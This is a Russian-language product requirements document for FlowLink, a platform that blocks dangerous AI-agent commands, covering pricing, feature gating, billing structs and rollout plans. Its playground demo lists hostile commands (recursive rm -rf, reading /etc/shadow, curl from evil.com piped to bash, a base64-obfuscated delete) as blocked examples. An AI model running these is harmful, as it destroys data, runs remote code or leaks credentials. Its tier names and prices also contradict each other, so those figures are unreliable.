# FlowLink — Product Requirements Document

**Version:** 1.0  
**Date:** 2026-04-09  
**Status:** Approved  
**Author:** Aleksandr Yudin + AI Partner

---

## 1. Product Vision

**FlowLink** — AI-native security platform для защиты серверов с AI-агентами.  
Архитектура: self-hosted agent на сервере клиента + cloud control plane.  
Лицензия: BSL 1.1 (source-available, не open source).

**One-liner:** «FlowLink — Ctrl+Z для продакшена. Перехватывает, анализирует и блокирует опасные команды AI-агентов на kernel-level.»

**Core value:** Пользователь ставит FlowLink → через час видит «заблокировано 3 угрозы» → доверие → платная подписка.

---

## 2. Business Model

### 2.1 Hybrid Architecture

```
Сервер клиента (self-hosted)          Cloud Control Plane (наш сервер)
┌──────────────────────┐            ┌─────────────────────┐
│  FlowLink Agent      │───────────▶│  Auth & License     │
│  Shield (eBPF/AST)   │  heartbeat │  Billing            │
│  K8s Operator        │  audit     │  Dashboard          │
│  GitOps Engine       │  alerts    │  Aggregated metrics │
│  Backup/Restore      │◀───────────│  Nudge engine       │
│  E2EE                │  config    │  WASM Playground    │
└──────────────────────┘            └─────────────────────┘
```

- Agent = heavy lifting (security, backups, GitOps) на железе клиента
- Control plane = лёгкий (heartbeat, billing, dashboard, license validation)
- Данные клиента НЕ покидают его сервер (только метрики/алерты)

### 2.2 Revenue Model

**Subscription per host count + feature gating.** Не usage-based. Не pay-per-request.

**Почему:**
- Self-hosted = мы НЕ несём инфраструктурных затрат клиента
- Предсказуемость для клиента (fixed price, не неожиданные счета)
- Hard limits проще понять и реализовать
- Usage-based = неожиданные счета = отток

### 2.3 Что НЕ делаем (Phase 1)

| Отказ | Почему | Когда вернуть |
|-------|--------|---------------|
| Промокоды | Нужны 1000+ paying юзеров для окупаемости | 100+ paying |
| Рефералки | Сложная логика + абуз | 500+ paying |
| Credits/баланс | Overhead, спам-атаки | 1000+ paying |
| Квартальная оплата | Две кнопки > трёх | — |
| Custom планы (в UI) | Ручной процесс дешевле | — |
| Usage-based add-ons | Усложняет модель | 1000+ paying |
| Marketplace | Нет критической массы | 24+ мес |

---

## 3. Pricing Tiers

### 3.1 Tier Definitions

| | **Starter** | **Professional** | **Scale** |
|---|---|---|---|
| **Аудитория** | Solo dev, оценка | Фрилансер, small team (1-3 чел) | Startup, IT-отдел, DevOps team |
| **Цена/мес** | *4 990₽* | *39 990₽* | *79 990₽* |
| **Год/мес** | — | **1 592₽** (-20%) | **3 992₽** (-20%) |
| **Серверы** | 1 | до 3 | до 25 |
| **Пользователи** | 1 | до 2 | до 10 |
| **Trial** | — | 14 дней, без карты | 14 дней, без карты |

### 3.2 Enterprise (не тир, а процесс)

- Кнопка «Связаться с нами» на странице Business
- От 29 990₽/мес, обсуждается индивидуально
- Безлимит серверов и пользователей
- SSO/SAML, SLA 99.9%, выделенный менеджер
- On-prem deployment assistance
- Не реализуется в биллинге — ручной процесс (CRM → звонок → договор)

---

## 4. Feature Matrix

### 4.1 Общие правила

- **E2EE на всех тарифах** (compute на стороне клиента, 0 затрат для нас)
- **Feature gating, не limit gating** — блокируем конкретную ценную фичу, не ставим лимит на «100 запросов»
- **Free реально работает** — не crippleware, не shadow-only

### 4.2 Relay (WebSocket Hub)

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| WebSocket подключение | 1 агент | до 3 | до 25 |
| REST API | ✅ | ✅ | ✅ |
| Rate limiting | ✅ базовый | ✅ | ✅ повышенный |
| Config hot-reload | ✅ | ✅ | ✅ |
| Graceful shutdown | ✅ | ✅ | ✅ |
| MCP tool protocol | ❌ | ✅ до 5/агент | ✅ безлимит |
| Metrics (Prometheus) | ❌ | ❌ | ✅ |

### 4.3 E2EE (Шифрование)

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| X25519 + AES-256-GCM | ✅ | ✅ | ✅ |
| Key rotation | ✅ | ✅ | ✅ |
| Session management | ✅ | ✅ | ✅ |

### 4.4 Shield — Pattern Matching (L1 basic)

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Pattern blocking (rm -rf, drop table и т.д.) | ✅ РЕАЛЬНО БЛОКИРУЕТ | ✅ | ✅ |
| Risk scoring (0-10) | ✅ | ✅ | ✅ |
| 50+ опасных паттернов по умолчанию | ✅ | ✅ | ✅ |

### 4.5 Shield — AST + Interpreter (L2)

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| AST анализ команд | ❌ | ✅ | ✅ |
| Interpreter анализ | ❌ | ✅ | ✅ |
| Обфускация detection (`cmd=$(echo cm0gLXJm\|base64 -d)`) | ❌ пропустит | ✅ поймает | ✅ поймает |
| Canary honeypots | ❌ | ✅ | ✅ |

### 4.6 Shield — eBPF Kernel-Level (L1 advanced)

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Kernel-level перехват (syscall) | ❌ | ❌ | ✅ |
| eBPF модули (aya) | ❌ | ❌ | ✅ |
| Sigstop/sigcont/sigkill | ❌ | ❌ | ✅ |
| Бинарные payload detection | ❌ | ❌ | ✅ |

### 4.7 Shield — Policy Engine

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| 3 уровня (allow/warn/block) | ❌ всё auto | ✅ | ✅ |
| Custom policy rules | ❌ | ✅ до 10 | ✅ безлимит |
| Policy DSL (YAML) | ❌ | ❌ | ✅ |

### 4.8 Shield — Approval Workflow

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Auto mode (разрешить безопасные) | ✅ только auto | ✅ | ✅ |
| Soft ask (уведомить + выполнить) | ❌ | ✅ | ✅ |
| Hard ask (блок до подтверждения) | ❌ | ✅ | ✅ |
| Approval via Dashboard | ❌ | ✅ | ✅ |
| Approval via Telegram | ❌ | ❌ | ✅ |

### 4.9 Shield — Forensics

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Risk scoring | ✅ | ✅ | ✅ |
| Process tree capture | ❌ | ❌ | ✅ |
| Forensic snapshots | ❌ | ❌ | ✅ |
| Webhook notifications (Slack/Telegram) | ❌ | ❌ | ✅ |

### 4.10 Backup / Restore

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Ручной бэкап (кнопка) | ✅ | ✅ | ✅ |
| Ручной rollback | ✅ | ✅ | ✅ |
| Авто-бэкап перед опасной командой | ❌ | ✅ | ✅ |
| Smart backup (diff, не полный) | ✅ | ✅ | ✅ |
| Deduplication | ❌ | ✅ | ✅ |
| Auto-restore при drift | ❌ | ❌ | ✅ |
| Storage max | **500MB** | **5GB** | **20GB** |
| Retention | 3 дня | 14 дней | 30 дней |
| Max snapshots | 5 | 50 | безлимит |
| Compression | gzip | gzip | zstd level 3 |
| Snapshot browsing | ❌ | ✅ | ✅ |

### 4.11 GitOps / Drift Detection

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Config drift detection | ❌ | ❌ | ✅ |
| Semantic diff | ❌ | ❌ | ✅ |
| Auto-fix rules | ❌ | ❌ | ✅ базовые + custom |
| Circuit breaker | ❌ | ❌ | ✅ |
| Rate budget | ❌ | ❌ | ✅ |

### 4.12 Sandbox

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Allowed dirs restriction | ✅ workdir only | ✅ custom | ✅ custom |
| Blocked patterns | ✅ базовые | ✅ custom | ✅ custom |
| Max file size | 10MB | 100MB | настраиваемый |
| Exec timeout | 60s | 300s | настраиваемый |
| Sudo control | ❌ | ❌ | ✅ configurable |

### 4.13 Kubernetes

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| K8s Operator | ❌ | ❌ | ✅ |
| CRD (FlowLinkShieldPolicy) | ❌ | ❌ | ✅ |
| Sidecar injection | ❌ | ❌ | ✅ |
| Admission webhook | ❌ | ❌ | ✅ |
| Drift detection (CR vs cluster) | ❌ | ❌ | ✅ |

### 4.14 RBAC

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Роли (admin/operator/viewer) | ❌ 1 user | ✅ 2 users | ✅ 10 users |
| 20 permissions | ❌ | ✅ базовые | ✅ все |
| Token auth | ❌ | ✅ | ✅ |
| SSO/SAML | ❌ | ❌ | Enterprise add-on |

### 4.15 Device Trust

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Device pairing (QR) | ❌ | ✅ | ✅ |
| Trust scoring (0-100) | ❌ | ✅ | ✅ |
| Auto-deny < 20 | ❌ | ❌ | ✅ |
| Push notifications | ❌ | ❌ | ✅ |

### 4.16 LLM Proxy

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Multi-backend (OpenAI/Anthropic/Ollama) | 1 backend | ✅ до 3 | ✅ безлимит |
| Token tracking | ❌ | ✅ | ✅ |
| Backend failover | ❌ | ❌ | ✅ |
| Request timeout control | 30s | настраиваемый | настраиваемый |

### 4.17 Audit

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Audit log (memory + JSONL) | ✅ 24ч | ✅ 30 дней | ✅ 90 дней |
| PostgreSQL audit | ❌ | ❌ | ✅ |
| SIEM export (CEF/LEEF/JSON) | ❌ | ❌ | ✅ |
| Session recording | ❌ | ❌ | ✅ |

### 4.18 Billing / Payments

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| SBP (Точка Банк) | — | ✅ | ✅ |
| Card (Visa/Mir/MC) | — | ✅ | ✅ |
| Bank transfer (юрлица) | — | ✅ | ✅ |
| Invoicing (20% НДС) | — | ✅ | ✅ |
| Subscription management | — | ✅ | ✅ |

### 4.19 Dashboard (Web UI)

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Agent list + status | ✅ basic | ✅ | ✅ |
| Shield alerts view | ✅ read-only | ✅ | ✅ |
| Approval queue | ❌ | ✅ | ✅ |
| Backup browser | ❌ | ✅ | ✅ |
| Audit log viewer | ✅ last 24h | ✅ | ✅ |
| System metrics | ❌ | ❌ | ✅ |
| Settings management | ❌ | ✅ | ✅ |
| Backup storage indicator | ✅ | ✅ | ✅ |

### 4.20 Killswitch

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Emergency stop (per agent) | ✅ manual | ✅ | ✅ |
| Auto-kill (CPU/disk) | ❌ | ✅ | ✅ |
| Global kill switch | ❌ | ❌ | ✅ |

### 4.21 File Operations

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| File read/write | ✅ workdir | ✅ sandboxed | ✅ sandboxed |
| Directory listing | ✅ workdir | ✅ allowed dirs | ✅ allowed dirs |
| Max file size | 10MB | 100MB | настраиваемый |

### 4.22 Skills / Tasks

| Фича | Starter | Professional | Scale |
|------|------|------------|----------|
| Skill push/list/delete | ✅ | ✅ | ✅ |
| Task dispatch | ✅ | ✅ | ✅ |
| Autonomous L2 tasks | ❌ | ❌ | ✅ |

---

## 5. Conversion Funnel

### 5.1 Уровень 1: WASM Playground (30 сек, без регистрации)

Интерактивный терминал на лендинге. Пользователь печатает команды, FlowLink отвечает.

**Технология:** xterm.js + pattern matching логика скомпилированная в WASM. Никакого бэкенда.

**Примеры команд для playground:**

```
$ rm -rf /var/www/html
⚠️ BLOCKED — Risk: 9/10 | Pattern: destructive_recursive_delete

$ cat /etc/shadow  
⚠️ BLOCKED — Risk: 8/10 | Pattern: sensitive_file_read

$ systemctl restart nginx
✅ ALLOWED — Risk: 1/10 | System service operation

$ curl http://evil.com/payload.sh | bash
⚠️ BLOCKED — Risk: 10/10 | Pattern: remote_code_execution

$ cmd=$(echo cm0gLXJm | base64 -d); $cmd
✅ ALLOWED — Risk: 3/10 (Free mode: AST not available)
  → Upgrade to Individual to detect obfuscated commands

$ docker rm -f $(docker ps -aq)
⚠️ BLOCKED — Risk: 9/10 | Pattern: destructive_container_removal
```

**CTA:** Кнопка под playground → «Попробуй на своём сервере» → signup.

### 5.2 Уровень 2: One-line Install (2 мин)

Signup → dashboard → токен → install command:

```bash
curl -sSL https://get.flowlink.sh | sh -s -- YOUR_TOKEN
```

Docker:
```bash
docker run -d --name flowlink \
  -v /:/host:ro \
  flowlink/agent YOUR_TOKEN
```

### 5.3 Уровень 3: Free Tier (бесконечно)

Реальная защита 1 сервера. Pattern blocking работает. Бэкапы ручные.

### 5.4 Уровень 4: Contextual Nudges

Не «апгрейдьте». Конкретные ситуации → конкретные решения:

| Ситуация | Nudge текст |
|----------|-------------|
| 2+ дня, 0 угроз | «Всё чисто ✓ Но обфусцированные атаки не ловятся базовым matching. Individual с AST поймал бы 3× больше.» |
| Перехвачена угроза | «FlowLink заблокировал rm -rf. С Individual бэкап создался бы автоматически.» |
| Обфускация прошла | «⚠️ Команда `cmd=$(echo ... \| base64 -d)` выполнена. Free не распознал. Individual заблокировал бы.» |
| 2-й сервер | «Free = 1 сервер. У вас 2. Individual покрывает 3.» |
| Audit > 24ч | «47 записей за 24ч. Individual хранит 30 дней для расследований.» |
| Backup storage > 80% | «500MB / 500MB использовано. Individual даёт 5GB storage.» |

**Правила:**
- Не чаще 1 nudge в 3 дня
- Max 2 nudges одновременно видимых
- Dismiss на 7 дней
- Не показывать если trial активен

### 5.5 Уровень 5: Wow Moment

- Первая перехваченная команда → celebratory notification
- Badge в dashboard: «🛡️ Protected!»
- Если тишина 24ч → reassuring: «FlowLink мониторит. 0 угроз. Всё чисто.»

---

## 6. Technical Requirements

### 6.1 Billing Engine Changes

**Текущее состояние:** Plans: Free/Pro/Enterprise. PlanLimits: api_requests, tokens, agents, storage_mb, payload_kb, webhook_rate, mcp_tools, audit_retention.

**Что изменить:**

```
PlanId: Free | Individual | Business (убрать Pro/Enterprise)

PlanLimits:
  - УБРАТЬ: api_requests_per_day, tokens_per_day, max_payload_kb, 
            webhook_rate_per_min, mcp_tools_per_agent
  - ДОБАВИТЬ: max_hosts (1/3/25), max_users (1/2/10), 
             backup_storage_mb (500/5120/20480),
             shield_level ("basic"/"advanced"/"enterprise"),
             features: Set<FeatureFlag>

FeatureFlag enum:
  - ASTAnalysis, InterpreterAnalysis, CanaryHoneypots
  - ApprovalWorkflow, CustomPolicies, PolicyDSL
  - EbpfShield, Forensics, WebhookNotifications
  - AutoBackup, AutoRestore, SmartBackup, Deduplication
  - K8sOperator, GitOps, SIEMExport, SessionRecording
  - RBAC, DeviceTrust, DeviceAutoDeny, PushNotifications
  - MultiBackend, TokenTracking, LLMFailover
  - PostgresAudit, PrometheusMetrics, GlobalKillSwitch
  - AutonomousL2, SudoControl, McpProtocol

Plan struct:
  - id: PlanId
  - name: String ("Free" / "Individual" / "Business")
  - description: String
  - tier: PlanTier (Free / Paid)
  - price_kopecks: u64 (0 / 199900 / 499000)
  - annual_price_kopecks: u64 (0 / 1592000 / 3992000)
  - limits: PlanLimits
  - features: HashSet<FeatureFlag>
  - trial_days: Option<u16> (None / Some(14) / Some(14))
  - available: bool
  - legacy: bool

Subscription struct:
  - Добавить: trial_start: Option<DateTime>, trial_end: Option<DateTime>
  - Добавить: is_trial: bool
  - Добавить: billing_period: BillingPeriod (Month / Year)
```

**BillingConfig changes:**
```rust
pub struct BillingConfig {
    pub enabled: bool,
    pub currency: String,  // "RUB"
    pub plans: Vec<PlanConfig>,
    pub tochka_jwt_token: Option<String>,
    // НОВОЕ:
    pub trial_days: u16,           // 14
    pub annual_discount_percent: u8, // 20
    pub overage_enabled: bool,     // false (отключено на Phase 1)
}
```

**Payment changes:**
- Убрать BillingPeriod::Quarter и BillingPeriod::Custom
- Оставить: Month, Year
- Trial: 14 дней на Individual и Business, без карты

### 6.2 Backup System Changes

**Smart Backup (diff-based):**

```rust
pub struct BackupRequest {
    // НОВОЕ: целевые пути, не всё
    pub target_paths: Vec<String>,  // только затронутые файлы
    pub trigger: BackupTrigger,      // Manual / PreCommand / AutoRestore
    pub strategy: BackupStrategy,    // Full / Diff / Smart
}

pub enum BackupTrigger {
    Manual,
    PreCommand { command: String, risk_score: u8 },
    DriftDetected { drift: Drift },
    Scheduled,
}

pub enum BackupStrategy {
    Full,           // полный бэкап (только для Manual)
    Diff,           // только изменённые файлы (PreCommand)
    Smart,          // только файлы затронутые командой (auto)
}
```

**Deduplication:**
```rust
pub struct BackupManager {
    // НОВОЕ:
    content_store: ContentAddressedStorage,  // SHA256 → content
    backup_index: BackupIndex,                // snapshot → list of (path, hash)
}
```

**Storage limits:**
```rust
pub struct BackupConfig {
    pub enabled: bool,
    pub max_snapshots: u32,          // 5 / 50 / unlimited
    pub max_storage_mb: u64,         // 500 / 5120 / 20480
    pub retention_days: u16,         // 3 / 14 / 30
    pub compression: CompressionType, // Gzip / Zstd(3) / Zstd(8)
    pub deduplication: bool,         // false / true / true
    pub backup_dir: String,
}
```

**Eviction policy:** Когда storage > max_storage_mb:
1. Удалить самые старые expired snapshots (retention_days)
2. Если всё ещё over → удалить самые старые (FIFO)
3. Dedup: удалить unreferenced content blobs

### 6.3 Control Plane API

**Новые эндпоинты:**

```
POST /api/auth/signup          — email + password → token
POST /api/auth/login           — email + password → token
GET  /api/account              — текущий план, usage, billing
POST /api/account/upgrade      — сменить план (Individual/Business)
POST /api/account/cancel       — отменить подписку
GET  /api/account/nudges       — получить активные nudges
POST /api/account/nudges/:id/dismiss — скрыть nudge

GET  /api/agents               — список подключённых серверов
GET  /api/agents/:id/status    — статус конкретного агента
GET  /api/agents/:id/alerts    — shield alerts за период
GET  /api/agents/:id/backups   — список бэкапов агента

POST /api/billing/checkout     — создать сессию оплаты (SBP/card)
POST /api/billing/webhook      — callback от Точка Банка
GET  /api/billing/invoices     — список инвойсов
GET  /api/billing/subscription — статус подписки
```

### 6.4 Heartbeat Protocol

```
Agent → Control Plane (каждые 30 сек):
{
  "agent_id": "uuid",
  "hostname": "server-prod-01",
  "os": "ubuntu",
  "arch": "x86_64",
  "version": "1.0.0",
  "status": "running",
  "shield_stats": {
    "blocked_today": 3,
    "allowed_today": 142,
    "alerts_total": 47
  },
  "backup_storage_used_mb": 234.5,
  "uptime_seconds": 86400
}

Control Plane → Agent (response):
{
  "plan": "individual",
  "features_enabled": ["ast_analysis", "approval_workflow", ...],
  "nudges": [...],
  "config_update": null  // или новый конфиг если hot-reload
}
```

**License validation:** Если heartbeat не пришёл > 5 мин → агент = offline. Если > 30 дней offline → downgrade до Free (локально, не блокировать).

**Host counting:** Control plane считает уникальные agent_id за последние 24ч. Если > max_hosts для плана → reject новых подключений с ошибкой «upgrade needed».

### 6.5 Install Script

**get.flowlink.sh:**
```bash
#!/bin/bash
# Auto-detect: Linux/macOS, arch (amd64/arm64)
# Download binary from GitHub Releases
# Create systemd service (Linux) or launchd (macOS)
# Register with control plane using token
# Print status: "FlowLink active on $(hostname)"
```

**Docker:**
```dockerfile
FROM debian:bookworm-slim
COPY flowlink-agent /usr/local/bin/
ENTRYPOINT ["flowlink-agent"]
```

### 6.6 WASM Playground

**Структура:**
```
website/
  src/
    components/
      Playground.tsx       — xterm.js терминал
      PlaygroundEngine.ts  — pattern matching логика (shared Rust → WASM)
    wasm/
      shield_patterns.wasm  — скомпилированная Rust логика
```

**Pattern matching → WASM:**
- Вынести pattern matching из shield crate в отдельный crate `flowlink-patterns`
- Скомпилировать с `wasm-pack build --target web`
- Импортировать в React компонент

**Примеры в playground:** 20+ команд (10 опасных, 5 обфусцированных, 5 безопасных)

---

## 7. Infrastructure Requirements

### 7.1 Текущий сервер (93.93.207.44)

| Ресурс | Всего | Занято | Свободно |
|--------|-------|--------|----------|
| CPU | 4 vCPU | ~15% | ~85% |
| RAM | 8GB | ~3.7GB | ~3.5GB |
| Disk | 78GB | ~20GB | ~58GB |

**Уже запущено:** Supabase (3.5GB RAM), Twenty CRM (500MB), FlowMasters bot (400MB), MAX bot (340MB), Next.js (200MB).

### 7.2 FlowLink Control Plane нагрузка

**100 Business × 25 серверов = 2 500 серверов:**

| Метрика | Значение |
|---------|----------|
| Heartbeats/sec | ~83 |
| Bandwidth in | ~3.6 GB/день |
| Dashboard WS connections | ~1 000 |
| DB writes (heartbeat batch) | ~83/sec |
| Control plane RAM | ~700MB |

### 7.3 Вместимость

| Business клиентов | Серверов | RAM нужно | Статус |
|-------------------|----------|-----------|--------|
| 10 | 250 | +500MB | ✅ легко |
| 30 | 750 | +800MB | ✅ ок |
| 50 | 1 250 | +1.2GB | 🟡 впритык |
| 100 | 2 500 | +2GB | ❌ нужен cleanup |

### 7.4 Оптимизации (Phase 1)

1. **Supabase**: оценить необходимость, убрать если не используется активно (освободит ~3.5GB)
2. **Twenty CRM**: вынести или убрать (~500MB)
3. **Audit logs**: НЕ хранить на нашем сервере. Агент хранит локально. Control plane = только агрегированные метрики.
4. **Heartbeat**: batch + UPSERT (не INSERT каждую запись)

### 7.5 Масштабирование

| MRR | Действие | Cost |
|-----|----------|------|
| < 150K₽ | Текущий сервер (после cleanup) | 0₽ |
| 150-500K₽ | +1 VPS (2 vCPU / 4GB) для control plane | ~500₽/мес |
| > 500K₽ | Managed PostgreSQL + отдельный server | ~3 000₽/мес |

---

## 8. Marginal Economics

### 8.1 COGS per клиент/мес

| Статья | Individual | Business |
|--------|------------|----------|
| Acquiring (1.5%) | 30₽ | 75₽ |
| Control plane (амортизация) | 10₽ | 10₽ |
| Поддержка | 250₽ | 1 000₽ |
| Инфраструктура/клиент | 10₽ | 15₽ |
| **Total COGS** | **~300₽** | **~1 100₽** |
| **Выручка** | **1 990₽** | **4 990₽** |
| **Валовая маржа** | **1 690₽ (85%)** | **3 890₽ (78%)** |

### 8.2 Backup storage cost

**Для нас: 0₽.** Всё хранится на сервере клиента. Control plane = только метаданные (~100 байт/снапшот).

**Для клиента (типичные значения):**

| Тариф | Storage max | Typical usage |
|-------|-------------|---------------|
| Free | 500MB | ~100MB |
| Individual | 5GB | ~1GB |
| Business | 20GB | ~5-10GB |

---

## 9. Landing Page Changes

### 9.1 Позиционирование

**Было:** «Ctrl+Z для rm -rf» (backup tool)  
**Стало:** «AI Security Platform» (security + control + compliance)

**Hero:**
- Заголовок: «Защита серверов с AI-агентами»
- Подзаголовок: «Перехватывает, анализует и блокирует опасные команды на kernel-level. E2EE, GitOps rollback, K8s operator.»
- CTA: «Попробуй в терминале →» (ведёт к playground)

### 9.2 Секция 1: Playground

Интерактивный терминал (см. 5.1). Кнопка «Попробуй на сервере» → signup.

### 9.3 Секция 2: Как это работает

3 шага:
1. Установи за 30 сек (one-line install)
2. FlowLink подключается и начинает мониторить
3. Опасные команды блокируются автоматически

### 9.4 Секция 3: Фичи

6 карточек (не 9, меньше = лучше):
1. Shield — kernel-level перехват
2. Smart Backup — auto-бэкап + restore
3. E2EE — шифрование по умолчанию
4. GitOps — auto-rollback при drift
5. K8s — нативный operator
6. Audit — compliance-ready логи

### 9.5 Секция 4: Pricing

3 колонки: Free / Individual / Business.

Две кнопки: «Ежемесячно» / «Ежегодно (скидка 20%)».

Enterprise = текстовая ссылка «Нужен безлимит? Свяжитесь с нами».

### 9.6 Убрать/заменить

- ❌ «MIT License» → BSL 1.1
- ❌ «Set & Forget» → заменить на concrete фичу
- ❌ «Telegram Control» → нет реализации (убрать до Phase 2)
- ❌ «Web Dashboard» → есть, но basic (не продавать как killer feature)

---

## 10. Implementation Plan

### Phase 1 — MVP для продаж (2-3 недели)

| # | Задача | Оценка | Зависимости |
|---|--------|--------|-------------|
| 1 | Обновить PlanId: Free/Individual/Business | 0.5д | — |
| 2 | Обновить PlanLimits (max_hosts, max_users, backup_storage_mb, FeatureFlag set) | 1д | #1 |
| 3 | Обновить PlanRegistry дефолтные планы | 0.5д | #2 |
| 4 | Trial: trial_days в subscription, is_trial flag | 1д | #3 |
| 5 | Годовая скидка -20% (annual_price_kopecks) | 0.5д | #3 |
| 6 | Убрать Quarterly/Custom из BillingPeriod | 0.5д | #3 |
| 7 | BackupConfig: max_storage_mb, deduplication, compression tier | 1д | — |
| 8 | Smart backup (diff-based) | 2д | #7 |
| 9 | Deduplication (content-addressed storage) | 2д | #7 |
| 10 | Install script (get.flowlink.sh) | 1д | — |
| 11 | Docker image + Docker Hub publish | 0.5д | — |
| 12 | Landing page: переписать позиционирование | 1д | — |
| 13 | WASM playground (xterm.js + shield patterns) | 2д | — |
| 14 | Signup API (email + password → token) | 1д | — |
| 15 | Dashboard: signup → token → install command | 1д | #14 |
| 16 | Control plane API: heartbeat, license validation | 2д | #3 |
| 17 | Биллинг persistence: PostgreSQL (BillingPersist impl) | 2д | #3 |

**Итого Phase 1: ~20 дней**

### Phase 2 — Конверсия (3-6 недель)

| # | Задача | Оценка |
|---|--------|--------|
| 18 | Contextual nudge engine | 2д |
| 19 | Wow moment triggers | 1д |
| 20 | Точка Банк SBP integration (production) | 3д |
| 21 | Точка Банк card payments | 2д |
| 22 | Webhook callback endpoint | 1д |
| 23 | Subscription management UI | 2д |
| 24 | Host counting enforcement | 1д |
| 25 | Backup storage indicator UI | 0.5д |
| 26 | Shield alerts forwarding to dashboard | 2д |

**Итого Phase 2: ~14.5 дней**

### Phase 3 — Scale (6-12 недель)

| # | Задача | Оценка |
|---|--------|--------|
| 27 | Enterprise onboarding flow | 3д |
| 28 | SIEM export production-ready | 2д |
| 29 | K8s operator production-ready | 3д |
| 30 | Documentation + API docs | 3д |
| 31 | Blog/TG content plan | 1д |
| 32 | Performance testing (2 500 servers sim) | 2д |
| 33 | Server cleanup (Supabase/Twenty evaluation) | 1д |

---

## 11. Targets

| Метрика | 3 мес | 6 мес | 12 мес |
|---------|-------|-------|--------|
| Free users | 100 | 300 | 800 |
| Individual | 20 | 50 | 120 |
| Business | 2 | 8 | 30 |
| MRR | ~50K₽ | ~140K₽ | ~390K₽ |
| Enterprise leads | 0 | 5 | 3 closed |

---

## 12. Risks

| Риск | Вероятность | Влияние | Митигация |
|------|-------------|---------|-----------|
| OpenClaw ломает код параллельно | Высокая | Среднее | Feature branches, не work on main |
| WASM компиляция shield crate | Среднее | Низкое | Вынести patterns в отдельный crate |
| Точка Банк API изменения | Низкое | Высокое | Абстракция + mock для тестов |
| Server OOM при 100+ Business | Среднее | Высокое | Cleanup + второй VPS при 150K MRR |
| Низкая конверсия Free→Paid | Среднее | Высокое | Nudge engine + wow moments |
| Конкурент (Falco open source) | Низкое | Среднее | eBPF + K8s + GitOps = unique combo |

---

## Appendix A: Feature Flag Enum

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum FeatureFlag {
    // Shield L2
    AstAnalysis,
    InterpreterAnalysis,
    CanaryHoneypots,
    
    // Shield Policy
    ApprovalWorkflow,
    CustomPolicies,
    PolicyDSL,
    
    // Shield L1 Advanced
    EbpfShield,
    Forensics,
    WebhookNotifications,
    
    // Backup
    AutoBackup,
    AutoRestore,
    SmartBackup,
    Deduplication,
    
    // Infrastructure
    K8sOperator,
    GitOps,
    SIEMExport,
    SessionRecording,
    
    // Access Control
    RBAC,
    DeviceTrust,
    DeviceAutoDeny,
    PushNotifications,
    
    // LLM
    MultiBackend,
    TokenTracking,
    LLMFailover,
    
    // Observability
    PostgresAudit,
    PrometheusMetrics,
    GlobalKillSwitch,
    
    // Advanced
    AutonomousL2,
    SudoControl,
    McpProtocol,
}
```

## Appendix B: Plan Defaults

```rust
// Free
Plan {
    id: PlanId::Free,
    name: "Free",
    price_kopecks: 0,
    annual_price_kopecks: 0,
    limits: PlanLimits {
        max_hosts: 1,
        max_users: 1,
        backup_storage_mb: 500,
        max_snapshots: 5,
        retention_days: 3,
        audit_retention_days: 1,
        max_file_size_mb: 10,
        exec_timeout_sec: 60,
    },
    features: {
        PatternBlocking | E2EE | ManualBackup | BasicSandbox | 
        RateLimit | ConfigHotReload | GracefulShutdown
    },
    trial_days: None,
}

// Individual
Plan {
    id: PlanId::Individual,
    name: "Individual",
    price_kopecks: 199900,
    annual_price_kopecks: 1592000,
    limits: PlanLimits {
        max_hosts: 3,
        max_users: 2,
        backup_storage_mb: 5120,
        max_snapshots: 50,
        retention_days: 14,
        audit_retention_days: 30,
        max_file_size_mb: 100,
        exec_timeout_sec: 300,
    },
    features: {
        // Free features +
        AstAnalysis | InterpreterAnalysis | CanaryHoneypots |
        ApprovalWorkflow | CustomPolicies | AutoBackup | SmartBackup |
        Deduplication | DeviceTrust | MultiBackend | TokenTracking |
        McpProtocol | BackupBrowser | SettingsManagement |
    },
    trial_days: Some(14),
}

// Business
Plan {
    id: PlanId::Business,
    name: "Business",
    price_kopecks: 499000,
    annual_price_kopecks: 3992000,
    limits: PlanLimits {
        max_hosts: 25,
        max_users: 10,
        backup_storage_mb: 20480,
        max_snapshots: 0,  // unlimited
        retention_days: 30,
        audit_retention_days: 90,
        max_file_size_mb: 0,  // configurable
        exec_timeout_sec: 0,  // configurable
    },
    features: {
        // Individual features +
        EbpfShield | PolicyDSL | Forensics | WebhookNotifications |
        TelegramApproval | AutoRestore | K8sOperator | GitOps |
        SIEMExport | SessionRecording | RBAC | DeviceAutoDeny |
        PushNotifications | LLMFailover | PostgresAudit |
        PrometheusMetrics | GlobalKillSwitch | AutonomousL2 |
        SudoControl
    },
    trial_days: Some(14),
}
```

---

**End of PRD**
